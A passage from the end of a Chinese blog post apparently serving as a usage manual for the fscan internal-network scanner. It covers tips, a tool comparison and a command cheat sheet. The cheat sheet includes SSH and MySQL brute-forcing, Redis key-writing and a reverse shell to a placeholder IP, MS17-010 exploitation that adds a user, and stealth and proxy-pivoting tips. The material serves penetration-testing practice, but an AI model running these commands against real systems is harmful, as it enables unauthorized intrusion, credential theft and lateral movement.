+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ users.txt 中 root 在最后面，可能被普通用户先匹配</span><br><span class="hljs-comment"># users.txt:</span><br><span class="hljs-comment"># test</span><br><span class="hljs-comment"># admin</span><br><span class="hljs-comment"># root</span><br><br><span class="hljs-comment"># ✅ 把高权限用户放前面</span><br><span class="hljs-comment"># users.txt:</span><br><span class="hljs-comment"># root</span><br><span class="hljs-comment"># admin</span><br><span class="hljs-comment"># test</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="16-4-Windows-上执行"><a href="#16-4-Windows-上执行" class="headerlink" title="16.4 Windows 上执行"></a>16.4 Windows 上执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Windows 上直接运行 exe ───</span><br>fscan64.exe -h 192.168.1.0/24<br><br><span class="hljs-comment"># ─── Windows 上 ICMP 可能需要管理员权限运行 CMD ───</span><br><span class="hljs-comment"># 右键 → 以管理员身份运行 → 执行 fscan</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="16-5-扫描速度与隐蔽性"><a href="#16-5-扫描速度与隐蔽性" class="headerlink" title="16.5 扫描速度与隐蔽性"></a>16.5 扫描速度与隐蔽性</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ 默认配置在生产环境可能太激进</span><br>fscan -h 10.0.0.0/8<br><br><span class="hljs-comment"># ✅ 控制速率</span><br>fscan -h 10.0.0.0/16 -t 100 -<span class="hljs-keyword">time</span> 5 -num 10<br><br><span class="hljs-comment"># ✅ Cobalt Strike 静默模式</span><br>fscan -h 192.168.1.0/24 -silent -t 100 -no<br></code></pre></td></tr></table></figure>
+
+<h3 id="16-6-Web-POC-误报"><a href="#16-6-Web-POC-误报" class="headerlink" title="16.6 Web POC 误报"></a>16.6 Web POC 误报</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ 全量 POC 可能有误报</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ✅ 指定 POC 名称减少误报</span><br>fscan -h 192.168.1.0/24 -pocname weblogic<br><br><span class="hljs-comment"># ✅ 降低 POC 发包速率</span><br>fscan -h 192.168.1.0/24 -num 10<br></code></pre></td></tr></table></figure>
+
+<h3 id="16-7-多层内网扫描"><a href="#16-7-多层内网扫描" class="headerlink" title="16.7 多层内网扫描"></a>16.7 多层内网扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ❌ 直接扫不了内层网段</span><br>fscan -h 172.16.1.0/24   <span class="hljs-comment"># 无路由可达</span><br><br><span class="hljs-comment"># ✅ 先建立隧道（frp/chisel），再通过代理扫</span><br>fscan -h 172.16.1.0/24 -proxy http://127.0.0.1:10800<br><br><span class="hljs-comment"># ✅ 或把 fscan 上传到跳板机执行</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="十七、fscan-vs-其他工具对比"><a href="#十七、fscan-vs-其他工具对比" class="headerlink" title="十七、fscan vs 其他工具对比"></a>十七、fscan vs 其他工具对比</h2><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>fscan</th>
+<th>nmap</th>
+<th>masscan</th>
+<th>nuclei</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>定位</strong></td>
+<td>内网综合扫描</td>
+<td>端口扫描 + 脚本</td>
+<td>高速端口扫描</td>
+<td>漏洞检测框架</td>
+</tr>
+<tr>
+<td><strong>语言</strong></td>
+<td>Go</td>
+<td>C</td>
+<td>C</td>
+<td>Go</td>
+</tr>
+<tr>
+<td><strong>速度</strong></td>
+<td>⚡ 快</td>
+<td>🟡 中等</td>
+<td>⚡⚡ 极快</td>
+<td>🟡 中等</td>
+</tr>
+<tr>
+<td><strong>存活探测</strong></td>
+<td>✅ ICMP&#x2F;Ping</td>
+<td>✅ -sn</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>端口扫描</strong></td>
+<td>✅</td>
+<td>✅（最全面）</td>
+<td>✅（最快）</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>密码爆破</strong></td>
+<td>✅ 内置</td>
+<td>🟡 脚本</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>漏洞检测</strong></td>
+<td>✅ MS17-010 等</td>
+<td>🟡 NSE 脚本</td>
+<td>❌</td>
+<td>✅（最全面）</td>
+</tr>
+<tr>
+<td><strong>漏洞利用</strong></td>
+<td>✅ Redis&#x2F;SSH&#x2F;MS17</td>
+<td>❌</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>Web 指纹</strong></td>
+<td>✅ CMS&#x2F;OA</td>
+<td>🟡 http-title</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>域控识别</strong></td>
+<td>✅ NetBIOS</td>
+<td>✅ smb-os-discovery</td>
+<td>❌</td>
+<td>❌</td>
+</tr>
+<tr>
+<td><strong>单文件</strong></td>
+<td>✅ 无依赖</td>
+<td>❌ 需安装</td>
+<td>❌ 需安装</td>
+<td>❌ 需模板</td>
+</tr>
+<tr>
+<td><strong>跨平台</strong></td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>内网首选</strong></td>
+<td>⭐⭐⭐⭐⭐</td>
+<td>⭐⭐⭐</td>
+<td>⭐⭐</td>
+<td>⭐⭐⭐</td>
+</tr>
+<tr>
+<td><strong>外网扫描</strong></td>
+<td>⭐⭐</td>
+<td>⭐⭐⭐⭐</td>
+<td>⭐⭐⭐⭐⭐</td>
+<td>⭐⭐⭐⭐⭐</td>
+</tr>
+</tbody></table>
+<p><strong>选择建议：</strong></p>
+<ul>
+<li>🔥 <strong>内网一键扫描</strong>：fscan（存活+端口+爆破+漏洞，一气呵成）</li>
+<li>🔍 <strong>精细端口扫描</strong>：nmap</li>
+<li>⚡ <strong>超高速端口扫描</strong>：masscan</li>
+<li>🎯 <strong>Web 漏洞精细检测</strong>：nuclei</li>
+</ul>
+<p><strong>典型内网工作流</strong>：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">fscan</span>（快速全景）→ 发现弱口令/漏洞 → 深入利用<br>     ↓<br>  提取 Web URL → nuclei 精细漏洞扫描<br>     ↓<br>  提取存活 <span class="hljs-built_in">IP</span> → nmap 详细端口扫描<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 一键全自动内网扫描</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># B 段快速侦察</span><br>fscan -h 10.10.0.0/16 -m icmp<br><br><span class="hljs-comment"># 指定端口 + 全功能</span><br>fscan -h 192.168.1.0/24 -p 80,443,445,3306,6379<br><br><span class="hljs-comment"># SSH 爆破</span><br>fscan -h 192.168.1.10 -m ssh -p 22 -userf users.txt -pwdf pass.txt<br><br><span class="hljs-comment"># MySQL 爆破</span><br>fscan -h 192.168.1.10 -m mysql -p 3306 -user root -pwdf pass.txt<br><br><span class="hljs-comment"># Redis 未授权 + 写公钥</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rf id_rsa.pub<br><br><span class="hljs-comment"># Redis 反弹 Shell</span><br>fscan -h 192.168.1.10 -m redis -p 6379 -rs YOUR_IP:6666<br><br><span class="hljs-comment"># SSH 命令执行</span><br>fscan -h 192.168.1.10 -c <span class="hljs-built_in">whoami</span><br><br><span class="hljs-comment"># MS17-010 检测 + 利用</span><br>fscan -h 192.168.1.0/24 -m ms17010 -p 445<br>fscan -h 192.168.1.10 -m ms17010 -p 445 -sc add<br><br><span class="hljs-comment"># 域控识别</span><br>fscan -h 192.168.1.0/24 -m netbios<br><br><span class="hljs-comment"># 跳过爆破和 POC（只扫端口）</span><br>fscan -h 192.168.1.0/24 -nobr -nopoc<br><br><span class="hljs-comment"># Web POC 专项</span><br>fscan -h 192.168.1.0/24 -pocname weblogic<br><br><span class="hljs-comment"># 静默模式（Cobalt Strike）</span><br>fscan -h 192.168.1.0/24 -silent -no<br><br><span class="hljs-comment"># 代理穿透扫描</span><br>fscan -h 172.16.1.0/24 -proxy http://127.0.0.1:10800<br><br><span class="hljs-comment"># 从文件导入目标</span><br>fscan -hf targets.txt -o result.txt<br></code></pre></td></tr></table></figure>
+
+<hr>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fscan-使用手册</div>
+      <div>https://xiaobite-hacker.github.io/2026/04/12/fscan-使用手册/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/12/nuclei-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" title="fscan-使用手册">
+                        <span class="hidden-mobile">fscan-使用手册</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
